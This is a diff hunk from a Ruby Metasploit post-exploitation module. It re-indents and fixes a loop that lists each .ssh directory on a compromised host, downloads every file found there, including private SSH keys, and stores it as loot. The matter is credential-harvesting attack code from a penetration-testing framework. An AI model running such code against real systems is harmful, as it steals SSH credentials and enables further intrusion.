@@ -61,15 +61,16 @@ class Metasploit3 < Msf::Post
 		if paths.nil? or paths.empty?
 			print_error("COULD NOT FIND .SSH, might be permissions issue")
 		else
-		paths.each do |path|
-			path.chomp!
-			sep = "/"
-			files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
-			print_status("PASSOU O LS")
-			files.each do |file|
-				print_status("Downloading #{path}#{sep}#{file} -> #{file}")
-				data = read_file("#{path}#{sep}#{file}")
-				store_loot("ssh.#{file}", "text/plain", session, data,"ssh_#{file}", "OpenSSH #{file} File")
+			paths.each do |path|
+				path.chomp!
+				sep = "/"
+				files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
+				print_status("PASSOU O LS")
+				files.each do |file|
+					print_status("Downloading #{path}#{sep}#{file} -> #{file}")
+					data = read_file("#{path}#{sep}#{file}")
+					store_loot("ssh.#{file}", "text/plain", session, data,"ssh_#{file}", "OpenSSH #{file} File")
+				end
 			end
 		end
 	end
